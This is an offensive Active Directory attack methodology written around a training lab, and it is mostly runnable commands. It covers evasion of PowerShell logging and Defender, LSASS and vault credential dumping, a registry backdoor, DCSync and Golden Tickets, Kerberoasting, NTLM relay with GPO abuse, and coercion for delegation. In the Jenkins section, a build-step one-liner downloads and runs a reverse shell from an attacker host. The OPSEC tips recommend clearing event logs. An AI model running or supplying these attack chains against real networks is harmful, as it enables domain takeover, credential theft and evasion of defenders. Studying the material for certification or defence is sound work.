# Enhanced Active Directory Attack Methodology & Techniques
## Comprehensive Reference with Lab Implementation Details

---

## SECTION 1: RECONNAISSANCE & ENUMERATION

### Phase 1A: Initial Domain Reconnaissance (No Privileges)

#### Invishi-Shell Setup (Bypass Enhanced Logging)
```batch
REM Start Invishi-Shell to avoid ScriptBlockLogging and ETW
C:\AD\Tools> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

REM Set environment variables for profiler bypass
C:\AD\Tools>set COR_ENABLE_PROFILING=1
C:\AD\Tools>set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}

REM Add CLR profiler hook to registry
C:\AD\Tools>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
C:\AD\Tools>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
C:\AD\Tools>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "C:\AD\Tools\InviShell\InShellProf.dll" /f

REM Launch PowerShell from this session
C:\AD\Tools>powershell
```

**Why This Matters:**
- Prevents ScriptBlockLogging of PowerShell commands
- Bypasses ETW (Event Tracing for Windows) monitoring
- Allows running enumeration tools without triggering Microsoft Defender for Identity (MDI)
- Critical for OPSEC during initial enumeration phase

---

#### User Enumeration
```powershell
# PowerView Method
Get-DomainUser | select -ExpandProperty samaccountname
Get-DomainUser | select samaccountname, description, pwdlastset

# AD Module Method
Get-ADUser -Filter * | select SamAccountName, Enabled, LastLogonDate
Get-ADUser -Filter * -Properties * | select Samaccountname, Description
```

#### Computer Enumeration
```powershell
# PowerView
Get-DomainComputer | select -ExpandProperty dnshostname

# AD Module
Get-ADComputer -Filter * | select DNSHostName, Enabled
```

#### Group Enumeration
```powershell
# Specific Groups
Get-DomainGroup -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain parent.local

# All groups
Get-DomainGroup | select name
```

---

### Phase 1B: File Share Enumeration & Access Control

#### PowerHuntShares Methodology
```powershell
# Import module
Import-Module C:\AD\Tools\PowerHuntShares.psm1

# Scan specific servers
Invoke-HuntSMBShares -NoPing -OutputDirectory C:\output\ -HostList C:\servers.txt

# Output: 
# - HTML report for web viewing (requires internet)
# - Identifies EVERYONE, BUILTIN\Users access
# - Shows Read, Write, Modify permissions
# - Critical findings: Admin share access
# - High findings: Writable shares by non-admin users
# - Medium findings: Public write access
```

**Key Findings to Look For:**
- `EVERYONE` has `WriteData/AddFile` on non-standard shares
- `BUILTIN\Users` with write permissions
- Application shares with weak permissions
- Custom shares (not C$, Admin$, IPC$)

---

### Phase 1C: Organization Unit (OU) & GPO Mapping

#### OU Structure
```powershell
Get-DomainOU | select -ExpandProperty name
# Output: Domain Controllers, StudentMachines, Applocked, Servers, DevOps

# Get computers in specific OU
(Get-DomainOU -Identity DevOps).distinguishedname | %{
  Get-DomainComputer -SearchBase $_ | select name
}
```

#### GPO Enumeration
```powershell
# List all GPOs
Get-DomainGPO | select displayname, name

# Get GPO applied to OU
PS C:\AD\Tools> (Get-DomainOU -Identity DevOps).gplink
# Output: [LDAP://cn={0BF8D01C-1F62-4BDC-958C-57140B67D147},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local;0]

# Method 1: Manual GUID extraction
# Copy GUID from gplink output (between { and })
Get-DomainGPO -Identity '{0BF8D01C-1F62-4BDC-958C-57140B67D147}'

# Method 2: Automated GUID extraction using substring
# Extracts 36 characters starting at position 11 (GUID length is fixed at 36)
Get-DomainGPO -Identity (Get-DomainOU -Identity DevOps).gplink.substring(11,(Get-DomainOU -Identity DevOps).gplink.length-72)

# Get specific GPO details by GUID
Get-DomainGPO -Identity '{GUID-HERE}'
```

#### GPO Analysis
```powershell
# Get GPO permissions (ACLs)
Get-DomainObjectAcl -Identity 'GPO-Name' -ResolveGUIDs

# Key findings:
# - RDPUsers with GenericAll on GPO
# - devopsadmin with WriteDACL
# - Everyone with AllExtendedRights
```

---

### Phase 2A: Domain Trust Enumeration

#### Forest & Domain Discovery
```powershell
# PowerView
Get-ForestDomain
Get-ForestDomain -Forest external.local

# AD Module  
(Get-ADForest).Domains
(Get-ADForest -Identity external.local).Domains
```

#### Trust Mapping
```powershell
# PowerView - List trusts for current domain
Get-DomainTrust

# PowerView - Map trusts across all domains in forest
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name}

# PowerView - Filter to external trusts only (non-transitive)
Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}

# PowerView - Enumerate trusts in trusting forest (requires bi-directional trust)
Get-ForestDomain -Forest external.local | %{Get-DomainTrust -Domain $_.Name}

# AD Module - List all trusts in current domain
Get-ADTrust -Filter *

# AD Module - List all trusts across forest domains
Get-ADForest | %{Get-ADTrust -Filter *}

# AD Module - Filter to external trusts only
(Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' -Server $_}

# AD Module - Filter external trusts in specific domain
Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)'

# AD Module - Enumerate trusts in trusting forest
Get-ADTrust -Filter * -Server external.local
```

**Trust Attributes Analysis:**
- `WITHIN_FOREST`: Child/parent domain (transitive)
- `FILTER_SIDS`: External trust (non-transitive, SID filtering)
- `TRANSITIVE`: Forest trust
- `BIDIRECTIONAL`: Trust flows both ways

---

### Phase 2B: BloodHound Data Collection & Analysis

#### BloodHound Legacy Setup
```powershell
# Neo4j Installation
C:\neo4j\bin\neo4j.bat install-service
C:\neo4j\bin\neo4j.bat start

# Access: http://localhost:7474
# Default: neo4j / neo4j (set new password)
```

#### SharpHound Collection (Legacy)
```bash
C:\AD\Tools\BloodHound-master\Collectors\SharpHound.exe 
  --collectionmethods Group,GPOLocalGroup,Session,Trusts,ACL,Container,ObjectProps,SPNTargets 
  --excludedcs
```

#### BloodHound CE Analysis
```
URL: https://crtpbloodhound-altsecdashboard.msappproxy.net/
Credentials: cartpreader@altsecdashboard.onmicrosoft.com (from lab portal)

Analysis Queries:
1. Cypher → Pre-Built Searches → Active Directory → Shortest paths to Domain Admins
2. Search → "StudentX" → Node Info → "Outbound Object Control"
3. Look for: GenericAll, WriteDACL, AllExtendedRights paths
4. Check: LOCAL ADMIN RIGHTS → Derivative Local Admin Rights
```

**Key BloodHound Findings:**
- Shortest paths to DA
- ACL-based escalation chains
- Kerberoasting targets
- Unconstrained delegation paths
- Database link chains leading to admin access

---

### Phase 3: Session Hunting & User Location

#### Session Enumeration
```powershell
# Find user sessions on remote machines (entire domain scan)
Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access

# Specific target list (OPSEC friendly - faster, less detection)
Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\servers.txt | 
  select Hostname,UserSession,Access

# Look for: Domain Admins or Service Accounts on accessible machines

# Example server list format (C:\servers.txt):
# DCORP-ADMINSRV
# DCORP-APPSRV
# DCORP-CI
# DCORP-MGMT
# DCORP-MSSQL
```

**Key Indicators:**
- `Access: True` = Current user has admin access on machine
- Service account sessions on admin-accessible machines = credential extraction opportunity
- DA sessions = privilege escalation target

#### Domain User Location
```powershell
# PowerView method (slow, checks all machines)
Find-DomainUserLocation

# Faster: Targeted approach
Get-DomainUser | %{Get-DomainUserLocation -UserName $_.samaccountname}

# Output: Machine where user is logged in (if DA access on machine)
```

**Key Indicators:**
- DA session on accessible machine → Extract credentials
- Service account session → Potential credential escalation
- Multiple privileged users on one machine → High value target

---

## SECTION 2: ACCESS CONTROL LIST (ACL) ANALYSIS

### ACL Enumeration Methodology

#### Enumerate ACLs on Specific Objects
```powershell
# Get all ACLs on a specific object (e.g., Domain Admins group)
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose

# Output fields:
# - AceQualifier: AccessAllowed / AccessDenied
# - ObjectDN: Target object
# - ActiveDirectoryRights: ReadProperty, WriteProperty, GenericAll, etc.
# - ObjectAceType: Specific property being modified
# - SecurityIdentifier: Who has the permission
# - IdentityReferenceName: Resolved name of the principal
```

#### Find Interesting ACLs Across Domain
```powershell
# Find all interesting permissions in domain
Find-InterestingDomainACL -ResolveGUIDs

# Filter by specific user
Find-InterestingDomainACL -ResolveGUIDs | ?{$_.IdentityReferenceName -match "StudentX"}

# Filter by specific group (e.g., RDPUsers that studentx is member of)
Find-InterestingDomainACL -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

# Output fields to analyze:
# - ObjectDN: Target object
# - ActiveDirectoryRights: Permission type
# - IdentityReferenceName: Who has permission
# - AceType: Allow/Deny
```

#### ACL Permission Types & Exploitation

| Permission | Target | Exploitation |
|-----------|--------|--------------|
| GenericAll | User | Reset password, add to group |
| GenericAll | Computer | RBCD, modify attributes |
| GenericAll | Group | Add self to group |
| GenericAll | GPO | Modify policy, inject commands |
| WriteDACL | GPO | Grant self write permission |
| WriteProperty | User | Modify attributes |
| AllExtendedRights | User | Reset password (extended right) |
| ForceChangePassword | User | Change password without knowing old |
| WriteDACL | Computer | RBCD configuration |

#### Real Lab Example
```
RDPUsers group (which studentx is member of):
- GenericAll over ControlXUser → Can reset password
- GenericAll over SupportXUser → Can reset password
- Full Control on Applocked GPO → Can modify policy
- Enrollment Rights on Certificate Templates

Exploitation Path:
1. Reset ControlXUser/SupportXUser password
2. Authenticate as modified user
3. Modify Applocked GPO via GPOddity
4. Enroll certificate via ESC1
```

---

## SECTION 3: CREDENTIAL EXTRACTION & DUMPING

### Local Credential Extraction

#### LSASS Dumping with Evasion
```powershell
# Method 1: SafetyKatz (obfuscated, in-memory)
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe 
  -args "sekurlsa::evasive-keys" "exit"

# Extract: Plaintext passwords, Kerberos keys (AES256, AES128, RC4)
# Output includes: Username, Domain, Password, AES256 hash

# Method 2: minidumpdotnet.dll + reverse.exe
# - Dump LSASS to file using custom API (undetected)
# - Transfer dump file
# - Reverse dump before parsing (obfuscates payload)
# - Parse with mimikatz locally
```

#### Credential Vault Extraction
```powershell
# Requires: SYSTEM or high-integrity process
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe 
  -args "token::elevate" "vault::cred /patch" "exit"

# Output: Plaintext service account credentials
# Common vault entries: TaskScheduler tasks, SAPI credentials
```

#### SAM & SYSTEM Hive Extraction
```powershell
# From DC with DA privileges
winrs -r:dc cmd
C:\> netsh interface portproxy add v4tov4 listenport=8080 
     listenaddress=0.0.0.0 connectport=80 connectaddress:172.16.100.x

C:\> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe 
     -args "token::elevate" "lsadump::sam" "exit"

# Output: Administrator, Guest, and machine account hashes
```

#### Registry-Based Backdoor
```powershell
# Modify remote registry to allow unprivileged read of SAM
Add-RemoteRegBackdoor -ComputerName target.domain.com -Trustee StudentX -Verbose

# Now read SAM as StudentX:
Get-RemoteMachineAccountHash -ComputerName target -Verbose

# Use machine account hash for Silver Ticket attacks
```

#### DCSync Attack (Domain Replication)

**Prerequisites:**
- DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights
- Can be granted by DA via ACL modification
- Typically requires domain-level permissions

**Detection of Replication Rights:**
```powershell
# Check if specific user has replication rights
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" 
  -SearchScope Base -ResolveGUIDs | 
  ?{($_.ObjectAceType -match 'replication-get') -or 
    ($_.ActiveDirectoryRights -match 'GenericAll')} | 
  ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' 
    $(Convert-SidToName $_.SecurityIdentifier);$_} | 
  ?{$_.IdentityName -match "studentx"}

# If output is empty, user does NOT have replication rights
# If output shows entries, user HAS replication rights → can execute DCSync
```

**Adding Replication Rights (requires DA on student VM):**
```powershell
# Start process as Domain Admin
C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
  -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 
    /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

# In DA process, grant replication rights
C:\Windows\system32> C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat
PS C:\Windows\system32> . C:\AD\Tools\PowerView.ps1
PS C:\Windows\system32> Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' 
  -PrincipalIdentity studentx 
  -Rights DCSync 
  -PrincipalDomain dollarcorp.moneycorp.local 
  -TargetDomain dollarcorp.moneycorp.local 
  -Verbose

# Verify grant succeeded
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" 
  -SearchScope Base -ResolveGUIDs | 
  ?{$_.IdentityName -match "studentx" -and $_.ObjectAceType -match 'replication-get'}
```

**Executing DCSync:**
```powershell
# Extract all hashes from domain (requires DA or replication rights)
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe 
  -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"

# Extract specific user
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe 
  -args "lsadump::evasive-dcsync /user:dcorp\Administrator /domain:dollarcorp.moneycorp.local" "exit"

# Extract all domain users (all_sync)
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe 
  -args "lsadump::evasive-dcsync" "exit"
```

**Output Contains:**
- NTLM hash
- AES256 key
- AES128 key  
- Primary credentials
- Supplemental credentials

**OPSEC:**
- DCSync leaves minimal logs (DRSR replications may not alert)
- Use from DC or compromised high-privilege account
- Time during maintenance windows
- Extract krbtgt for persistence via Golden Tickets
- Clean DC security event logs (Event ID 4104, 4688)

---

## SECTION 4: PRIVILEGE ESCALATION - DETAILED PATHS

### 4A: LOCAL PRIVILEGE ESCALATION TOOLS & TECHNIQUES

#### PowerUp - Service Vulnerability Detection

**Installation & Execution:**
```powershell
# Load PowerUp from Invisi-Shell (avoid logging)
C:\AD\Tools> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
PS C:\AD\Tools> . C:\AD\Tools\PowerUp.ps1
PS C:\AD\Tools> Invoke-AllChecks
```

**Exploitable Vulnerabilities:**
```powershell
# Unquoted Service Paths
# Output: ServiceName, Path, ModifiablePath, CanRestart
# Exploitation: Write executable to modifiable path, restart service

# Service Binary Permissions
# Output: Writable service executable locations
# Exploitation: Replace binary, restart, service runs as SYSTEM

# Service Permissions  
# Output: Services modifiable by current user
# Exploitation: Use Invoke-ServiceAbuse to modify service binPath

# DLL Hijacking
# Output: DLLs in service directory without signatures
# Exploitation: Plant malicious DLL, trigger service
```

**Example Exploitation:**
```powershell
# Identify vulnerable service (AbyssWebServer in lab)
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose

# Result: Current user added to local Administrators group
# Service runs command: net localgroup Administrators dcorp\studentx /add

# Logoff/login: User now has local admin privileges
```

---

#### WinPEAS - Comprehensive Privilege Escalation Scanner

**Execution:**
```powershell
# Using obfuscated version with Loader
C:\AD\Tools> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\winPEASx64.exe -args notcolor log

# Output redirected to out.txt (approx 2000+ lines)
```

**Key Sections to Review:**
```
1. Services Information:
   - Interesting Services (non-Microsoft)
   - Modifiable Services (check if AllAccess)
   - Service Executable Permissions
   
2. Processes Information:
   - Running processes with high privileges
   - Parent/child process relationships
   
3. Files & Folders Permissions:
   - World-writable locations
   - Modifiable system directories
   
4. Scheduled Tasks:
   - Custom tasks with SYSTEM privileges
   - Writable task binaries
```

**Analysis Focus:**
- `AllAccess` permissions = Modifiable service
- `WriteData/AddFile` on system paths = DLL hijacking
- Services running as SYSTEM = High-value targets

---

#### PrivEscCheck - Quick Privilege Escalation Assessment

**Execution:**
```powershell
PS C:\AD\Tools> . C:\AD\Tools\PrivEscCheck.ps1
PS C:\AD\Tools> Invoke-PrivescCheck

# Output format: Categorized findings with severity levels
```

**Finding Categories:**
```
TA0004 - Privilege Escalation:
- Service permissions (vulnerable SCM permissions)
- File permissions (writable system files/binaries)
- Registry key permissions
- Scheduled task vulnerabilities
- DLL hijacking opportunities
```

**Key Indicator Statuses:**
- `Status: Vulnerable - High` = Immediate exploitation possible
- `UserCanStart` = Service can be restarted by current user
- `AccessRights: AllAccess` = Full control over service

---

#### Finding Machines with Local Admin Access

**Using Find-PSRemotingLocalAdminAccess:**
```powershell
# From current user context
PS C:\AD\Tools> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
PS C:\AD\Tools> Find-PSRemotingLocalAdminAccess

# Output: Machines where current user has admin privileges
# Lab example: dcorp-adminsrv (studentx has admin access)
```

**Accessing Admin Machines:**
```powershell
# WinRM Method
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local

# CMD Method
winrs -r:dcorp-adminsrv cmd

# PowerShell Remoting
Invoke-Command -ComputerName dcorp-adminsrv -ScriptBlock { whoami }
```

**Credential Extraction Chain:**
```
1. Get admin access to accessible machine (Find-PSRemotingLocalAdminAccess)
2. Dump credentials from that machine (SafetyKatz, Mimikatz)
3. Check if dumped credentials are DA or have interesting group memberships
4. Use extracted credentials to access other machines
5. Repeat until Domain Admin achieved
```

**Lab Example Flow:**
```
studentx → Local Admin on dcorp-adminsrv
         → Extract creds: appadmin, srvadmin, websvc
         → srvadmin is admin on dcorp-mgmt
         → svcadmin (DA) has session on dcorp-mgmt
         → Extract svcadmin → Domain Admin
```

---

#### Jenkins Server Exploitation (Web Service Abuse)

**Vulnerability Identification:**
```
Jenkins instances often have:
- Weak password policies (many users set password = username)
- Misconfigured build permissions (non-admin users can Configure builds)
- Ability to add Build Steps with arbitrary commands
```

**Exploitation Steps:**

1. **Access Jenkins Console:**
   - Navigate to Jenkins instance (e.g., http://dcorp-ci:8080)
   - Check "People" page to enumerate users
   - Attempt default/weak credentials (e.g., username as password)

2. **Identify User Permissions:**
   - Look for users with "Configure builds" permission
   - These users can modify build configurations and add arbitrary build steps

3. **Create Reverse Shell Payload:**
   ```powershell
   # Rename function to evade Windows Defender detection
   # Example: Rename Invoke-PowerShellTcp to "Power"
   # Include function call at end: Power -Reverse -IPAddress 172.16.100.X -Port 443
   ```

4. **Add Malicious Build Step:**
   - Job → Configure → Build → Add Build Step
   - Command: `powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443`
   - Use `-encodedcommand` parameter for additional obfuscation if needed

5. **Trigger Build Execution:**
   - Run build manually or wait for scheduled execution
   - Reverse shell connects from Jenkins service account (often SYSTEM or high-privilege context)

---

### Path 1: Local Admin → Domain Admin via Reverse Shell

#### Step 1: Initial Compromise → Local Admin
```
Jenkins (dcorp-ci) Running as ciadmin (local admin equivalent)
  ↓
Reverse shell spawned via malicious build step
  ↓
PS running as: ciadmin (SYSTEM context in Jenkins workspace)
```

#### Step 2: Port Forwarding for Tool Delivery
```powershell
# From reverse shell
$null | winrs -r:dcorp-mgmt 
  "netsh interface portproxy add v4tov4 
    listenport=8080 listenaddress=0.0.0.0 
    connectport=80 connectaddress=172.16.100.x"

# Purpose: Avoid direct download from attacker IP on target machine
```

#### Step 3: In-Memory Tool Execution
```powershell
# Copy Loader to accessible network location
xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe

# Execute SafetyKatz through port forwarded HTTP
$null | winrs -r:dcorp-mgmt 
  "cmd /c C:\Users\Public\Loader.exe 
    -path http://127.0.0.1:8080/SafetyKatz.exe 
    sekurlsa::evasive-keys exit"
```

#### Step 4: Credential Extraction & Usage
```
Output: svcadmin AES256 hash (DA account)
  ↓
Rubeus OverPass-the-Hash with extracted AES256
  ↓
New process with svcadmin/DA privileges
  ↓
Access domain controller: winrs -r:dcorp-dc cmd
```

---

### Path 2: Local Admin → DA via Derivative Admin Chain

#### Step 1: Find Accessible Machines with Local Admin
```powershell
Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local
# Output: dcorp-adminsrv (has admin sessions from appadmin, srvadmin, websvc)
```

#### Step 2: Extract Service Account Credentials
```powershell
# Remote into admin-accessible machine
Enter-PSSession dcorp-adminsrv

# Load Mimikatz via Program Files (bypass Applocker)
Copy-Item Invoke-TheKatEx-keys.ps1 
  \\dcorp-adminsrv\c$\'Program Files'

# Execute from Program Files (allowed by Applocker)
[dcorp-adminsrv]: PS C:\Program Files> .\Invoke-TheKatEx-keys.ps1

# Output: appadmin, srvadmin, websvc credentials (plaintext or keys)
```

#### Step 3: Find Machines Where Extracted User is Admin
```powershell
# Use extracted srvadmin credentials
runas /user:dcorp\srvadmin /netonly cmd

# From new process
Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local
# Output: dcorp-mgmt (has svcadmin/DA session logged in!)
```

#### Step 4: Extract DA Credentials
```
srvadmin is admin on dcorp-mgmt
dcorp-mgmt has svcadmin (DA) session
  ↓
Extract svcadmin credentials from dcorp-mgmt
  ↓
Achieve Domain Admin
```

---

### Path 3: Applocker Bypass via Program Files Default Rule

#### Applocker Rule Identification

**Step 1: Query Registry for Applocker Configuration**
```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2

# Output shows configured rule types:
# - Appx (Windows Store apps)
# - Dll (Dynamic link libraries)
# - Exe (Executables)
# - Msi (Windows installer packages)
# - Script (PowerShell scripts)
```

**Step 2: Enumerate Script Rules**
```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script

# Output: List of GUID-based rules
# Look for: Rules with %PROGRAMFILES%\* and %WINDIR%\* paths
```

**Step 3: Inspect Specific Rule**
```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\{GUID}

# Output example:
# REG_SZ "(Default Rule) All scripts located in the Program Files folder"
# Path: %PROGRAMFILES%\*
# Action: Allow
# UserOrGroupSid: S-1-1-0 (Everyone)
```

**PowerShell Alternative:**
```powershell
# From PSRemoting session on protected machine:
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Shows Path conditions and whether Everyone has Allow action
```

#### Exploitation Steps

**Option A: Via WinRS (Remote Command)**
```powershell
# 1. Copy CLM-compatible script to Program Files
Copy-Item Invoke-TheKatEx-keys.ps1 
  \\dcorp-adminsrv\c$\'Program Files'

# 2. Execute via winrs (WinRM)
winrs -r:dcorp-adminsrv "powershell -c C:\Program Files\Invoke-TheKatEx-keys.ps1"

# Result: Script executes, bypasses Applocker default rule allows Program Files
```

**Option B: Via PSRemoting (Interactive)**
```powershell
# 1. Connect to remote machine (will enter CLM)
Enter-PSSession -ComputerName dcorp-adminsrv

# 2. Copy script to Program Files
Copy-Item C:\source\Invoke-TheKatEx-keys.ps1 'C:\Program Files'

# 3. Execute from Program Files
CD 'C:\Program Files'
.\Invoke-TheKatEx-keys.ps1

# Result: CLM-compatible script runs despite Constrained Language Mode
```

**Key Requirements:**
- Script must be copied to C:\Program Files\ (Applocker default allows this)
- Script must NOT use dot-sourcing (. .\script.ps1) - CLM blocks this
- Script must contain complete function definition + direct function call at end
- No external dependencies or module imports

---

### Path 4: GPO Abuse via WriteDACL + NTLM Relay

#### Prerequisites
- User with WriteDACL on GPO (e.g., RDPUsers group)
- GPO applied to machines (e.g., DevOps OU → dcorp-ci)
- Ability to execute lnk file on target (e.g., automation)

#### Detailed Exploitation

**Step 1: Start NTLM Relay Listener**
```bash
# On Ubuntu WSL
sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.x 
  --http-port '80,8080' -i --no-smb-server

# Creates LDAP shell on port 11000
```

**Step 2: Create Trigger File**
```
Create shortcut (.lnk) file with:
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
  -Command "Invoke-WebRequest -Uri 'http://172.16.100.X' -UseDefaultCredentials"

This forces authentication to our relay server
```

**Step 3: Trigger Authentication**
```
Copy .lnk file to \\dcorp-ci\AI (writable share)
Automation on dcorp-ci executes .lnk file
Credentials relay to our LDAP listener
```

**Step 4: Use LDAP Shell to Grant Permissions**
```bash
# In nc 127.0.0.1 11000 session
write_gpo_dacl studentx {0BF8D01C-1F62-4BDC-958C-57140B67D147}

# Grants studentx WriteDACL on DevOps Policy
```

**Step 5: Modify GPO with GPOddity**
```bash
python3 gpoddity.py 
  --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147'
  --domain 'dollarcorp.moneycorp.local'
  --username 'studentx'
  --password 'password'
  --command 'net localgroup administrators studentx /add'
  --rogue-smbserver-ip '172.16.100.x'
  --rogue-smbserver-share 'stdx-gp'
  --dc-ip '172.16.2.1'
  --smb-mode none
```

**Step 6: Force GPO Refresh**
```
Policy applies every 2 minutes on dcorp-ci
Or manually: gpupdate /force
```

**Result:** studentx added to local administrators on dcorp-ci

---

## SECTION 5: KERBEROS-BASED ATTACKS

### Kerberoasting - Complete Workflow

#### Identification Phase
```powershell
# Find service accounts with SPNs
Get-DomainUser -SPN | select samaccountname, serviceprincipalname

# Lab example: svcadmin with MSSQLSvc SPN
# svcadmin is also Domain Admin

# Also check computer SPNs
Get-DomainComputer -SPN
```

#### Extraction Phase - Single User
```powershell
# Request TGS for specific service account
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
  -args kerberoast 
    /user:svcadmin 
    /simple 
    /rc4opsec 
    /outfile:C:\AD\Tools\hashes.txt

# /rc4opsec: Request only RC4-HMAC (faster cracking, less resource intensive)
# /simple: Simpler output format
```

#### Extraction Phase - All Service Accounts
```powershell
# Roast all Kerberoastable users
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
  -args kerberoast 
    /rc4opsec 
    /outfile:all_hashes.txt

# Or using PowerView
Invoke-Kerberoast -OutputFormat Hashcat | % { $_.Hash } | Out-File hashes.txt
```

#### Cracking Phase
```bash
# Prepare hash (remove :port from SPN if present)
# File format: $krb5tgs$23$*svcadmin$DOMAIN$SPNWithoutPort*

john --wordlist=10k-worst-pass.txt hashes.txt

# Hashcat
hashcat -m 13100 hashes.txt wordlist.txt

# Lab output: *ThisisBlasphemyThisisMadness!!
```

#### Post-Crack Usage
```powershell
# Use cracked password
$credential = New-Object System.Management.Automation.PSCredential(
  'dollarcorp\svcadmin',
  (ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force)
)

# Alternative: OverPass-the-Hash if only hash available
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
  -args asktgt 
    /user:svcadmin 
    /aes256:hash_value 
    /opsec 
    /createnetonly:cmd.exe 
    /show 
    /ptt
```

**OPSEC Considerations:**
- `/rc4opsec`: Only request RC4 hashes (faster cracking, older accounts)
- Spread requests over time (suspicious if 100+ in seconds)
- Use from compromised machine (not attacker IP)
- Clean up requestor logs (event ID 4688, 4720)
- Use protected networks for hash transmission
- Consider offline roasting from captured traffic instead of live requests

---

### Unconstrained Delegation + Coercion

#### Detection
```powershell
Get-DomainComputer -Unconstrained | select -ExpandProperty name
# Output: DCORP-DC (always), DCORP-APPSRV
```

#### Prerequisites
- Admin access on unconstrained machine (dcorp-appsrv as appadmin)
- Ability to force authentication from target DC

#### Attack Execution

**Setup: Start Listener**
```powershell
# On dcorp-appsrv with admin privileges
winrs -r:dcorp-appsrv cmd

C:\Users\appadmin> netsh interface portproxy add v4tov4 
  listenport=8080 listenaddress=0.0.0.0 
  connectport=80 connectaddress=172.16.100.x

C:\Users\appadmin> C:\Users\Public\Loader.exe 
  -path http://127.0.0.1:8080/Rubeus.exe 
  -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
```

**Force Authentication (Multiple Methods)**

*Option A: Printer Bug (MS-RPRN)*
```
MS-RPRN.exe \\dcorp-dc.domain.com \\dcorp-appsrv.domain.com
```

*Option B: Windows Search Protocol (MS-WSP)*
```
WSPCoerce.exe DCORP-DC DCORP-APPSRV
```

*Option C: DFS Namespaces (MS-DFSNM)*
```
DFSCoerce-andrea.exe -t dcorp-dc -l dcorp-appsrv
```

**Capture & Use TGT**
```powershell
# Rubeus monitor captures: DCORP-DC$@DOMAIN TGT

# Copy base64 ticket from monitor output
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
  -args ptt /ticket:doIFx...

# Use ticket for DCSync
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe 
  -args "lsadump::dcsync /user:krbtgt" "exit"
```

---

### Golden Ticket Attack

#### Prerequisites
- krbtgt AES256 or NTLM hash (via DCSync or LSADump on DC)
- Domain SID
- Target user and groups
- Domain Controller FQDN

#### Extract krbtgt Hash

**Method 1: From DC with DA privileges**
```powershell
C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe 
  -args "lsadump::evasive-lsa /patch" "exit"

# Output includes all user hashes including krbtgt
```

**Method 2: DCSync (no DC access needed)**
```powershell
C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe 
  -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"

# Extract AES256, AES128, and NTLM hashes of krbtgt
```

#### Generate Golden Ticket Command with Auto-Parameters

**Step 1: Use /ldap and /printcmd for automatic configuration**
```powershell
C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
  -args evasive-golden 
    /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 
    /sid:S-1-5-21-719815819-3726368948-3917688648 
    /ldap 
    /user:Administrator 
    /printcmd

